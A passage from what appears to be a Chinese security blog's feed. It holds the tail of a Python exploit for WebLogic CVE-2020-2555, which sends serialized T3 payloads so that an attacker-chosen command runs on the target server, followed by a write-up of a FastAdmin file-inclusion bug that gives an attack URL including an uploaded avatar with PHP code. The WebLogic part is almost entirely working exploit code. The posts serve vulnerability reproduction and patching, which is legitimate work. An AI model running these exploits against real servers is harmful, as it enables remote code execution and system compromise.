class="line">52</span></pre></td><td class="code"><pre><span class="line">        sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">        time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">        #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        #print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">    def buildT3RequestObject(self,sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">        data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">        data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">        for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">            sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">        #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    def sendEvilObjData(self,sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">        payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">        res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">        n&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">                n +&#x3D; 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">                res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">                time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">                if(n&gt;15):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">                    break</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">        return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    def check(self, url, cmd,timeout, proxies&#x3D;globalProxies, **args):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        (proto, ip, port, uri) &#x3D; parseUrl(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">        server_addr &#x3D; (ip, int(port))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">        if proto &#x3D;&#x3D; &#39;https&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">        sock.settimeout(timeout)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">            self.t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">            self.buildT3RequestObject(sock,port)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">            payload &#x3D; CVE_2020_2555(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">            resp &#x3D; self.sendEvilObjData(sock,payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[+] Payload send succeed! Please check.&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line">            return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[-] Failed! Exception:&#123;&#125;&#39;.format(str(e)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">        return False</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">def poc(url,cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">    x &#x3D; payloadtest()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">    return x.check(url, cmd,20)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Weblogic cve-2020-2555 Exp&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">                                     usage&#x3D;&#39;[*] use &quot;python %(prog)s --help&quot; for more information&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">                                     formatter_class&#x3D;argparse.RawTextHelpFormatter)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the url to check&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the cmd to run on the target&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">    args &#x3D; parser.parse_args()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">    if not args.url or not args.cmd:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line">        sys.exit(&#39;[*] Please assign url and cmd! \n[*] Examples python cve-2020-2883_cmd.py -u http:&#x2F;&#x2F;127.0.0.1:7001 -c calc&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">    poc(args.url, args.cmd)</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      weblogic历史漏洞利用总结与检测
    
    </summary>
    
    
      <category term="漏洞总结" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="weblogic" scheme="http://h3art3ars.github.io/tags/weblogic/"/>
    
      <category term="漏洞检测" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>fastadmin前台漏洞复现</title>
    <link href="http://h3art3ars.github.io/2020/09/23/fastadmin%E5%89%8D%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://h3art3ars.github.io/2020/09/23/fastadmin%E5%89%8D%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T02:24:50.000Z</published>
    <updated>2020-09-23T02:31:43.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastAdmin前台漏洞getshell分析"><a href="#FastAdmin前台漏洞getshell分析" class="headerlink" title="FastAdmin前台漏洞getshell分析"></a>FastAdmin前台漏洞getshell分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h4 id="V1-0-0-20200506-beta"><a href="#V1-0-0-20200506-beta" class="headerlink" title="V1.0.0.20200506_beta"></a>V1.0.0.20200506_beta</h4><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>根据官网的修复方法</p><p><img src="/images/image-20200921165512720.png" alt="image-20200921165512720"></p><p>可以看到产生漏洞的位置  <code>application/index/controller/User.php</code> 看一下 <code>_empty()</code> 方法，将传入的 <code>$name</code>参数未经过滤，直接传输到 <code>fetch</code>方法中。</p><p>先调用了 view文件内的 <code>fetch</code> 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template &#x3D; &#39;&#39;, $vars &#x3D; [], $replace &#x3D; [], $config &#x3D; [], $renderContent &#x3D; false)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">   &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 模板变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">       $vars &#x3D; array_merge(self::$var, $this-&gt;data, $vars);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 页面缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">       ob_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">       ob_implicit_flush(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">       &#x2F;&#x2F; 渲染输出</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">       try &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">           $method &#x3D; $renderContent ? &#39;display&#39; : &#39;fetch&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">           &#x2F;&#x2F; 允许用户自定义模板的字符串替换</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">           $replace &#x3D; array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">           $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">           $this-&gt;engine-&gt;$method($template, $vars, $config); &#x2F;&#x2F;$template为传入参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">       &#125; catch (\Exception $e) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">           ob_end_clean();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">           throw $e;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">       &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">      ...</span></pre></td></tr></table></figure><p>之后调用了 think文件内的 <code>fetch</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template, $data &#x3D; [], $config &#x3D; [])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        if (&#39;&#39; &#x3D;&#x3D; pathinfo($template, PATHINFO_EXTENSION)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 获取模板文件名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            $template &#x3D; $this-&gt;parseTemplate($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 模板不存在 抛出异常</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if (!is_file($template)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            throw new TemplateNotFoundException(&#39;template not exists:&#39; . $template, $template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 记录视图信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        App::$debug &amp;&amp; Log::record(&#39;[ VIEW ] &#39; . $template . &#39; [ &#39; . var_export(array_keys($data), true) . &#39; ]&#39;, &#39;info&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;template-&gt;fetch($template, $data, $config);</span></pre></td></tr></table></figure><p>在此处经过 <code>is_file</code> 函数判断 ，再次调用<code>template</code>文件内的 <code>fetch</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function fetch($template, $vars &#x3D; [], $config &#x3D; [])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    if ($vars) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;data &#x3D; $vars;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    if ($config) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;config($config);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    if (!empty($this-&gt;config[&#39;cache_id&#39;]) &amp;&amp; $this-&gt;config[&#39;display_cache&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 读取渲染缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $cacheContent &#x3D; Cache::get($this-&gt;config[&#39;cache_id&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        if (false !&#x3D;&#x3D; $cacheContent) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            echo $cacheContent;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            return;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    $template &#x3D; $this-&gt;parseTemplateFile($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    if ($template) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        $cacheFile &#x3D; $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($this-&gt;config[&#39;layout_name&#39;] . $template) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if (!$this-&gt;checkCache($cacheFile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 缓存无效 重新模板编译</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            $content &#x3D; file_get_contents($template);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;compiler($content, $cacheFile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 页面缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        ob_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        ob_implicit_flush(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F; 读取编译存储</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data); &#x2F;&#x2F;此处为thinkphp&lt;5.0.18 文件包含漏洞发生处</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        $content &#x3D; ob_get_clean();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        ......</span></pre></td></tr></table></figure><p>主要意思就是将传入的未经过滤<code>$template</code>文件，经过  <code>$this-&gt;storage-&gt;read</code>包含执行，最终造成文件包含漏洞。</p><p>要访问漏洞的方法，必须是配置文件为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;是否开启前台会员中心</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#39;usercenter&#39;            &#x3D;&gt; true,</span></pre></td></tr></table></figure><p>[90sec][<a href="https://forum.90sec.com/t/topic/1294]" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/1294]</a> 上有人发出windows上面的利用方式。</p><p>先注册用户，之后上传带有php代码的头像，查看头像位置，最后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;index.php&#x2F;index&#x2F;user&#x2F;_empty?name&#x3D;..&#x2F;uploads&#x2F;xxxxxx.jpg</span></pre></td></tr></table></figure><p>即可包含文件</p><p>如果含有其他的文件可控点，也是可以包含的，比如仍然使用低版本thinkphp的fastadmin的日志。包含的文件必须有后缀名，否则默认为 <code>.html</code></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="V1-0-0-20200920-beta已修复，官方删除了-application-index-User-php-内的-empty-方法。"><a href="#V1-0-0-20200920-beta已修复，官方删除了-application-index-User-php-内的-empty-方法。" class="headerlink" title="V1.0.0.20200920_beta已修复，官方删除了 application/index/User.php 内的 _empty() 方法。"></a>V1.0.0.20200920_beta已修复，官方删除了 <code>application/index/User.php</code> 内的 <code>_empty()</code> 方法。</h4>]]></content>
    
    <summary type="html">
    
      fastadmin202005漏洞复现
    
    </summary>
    
    
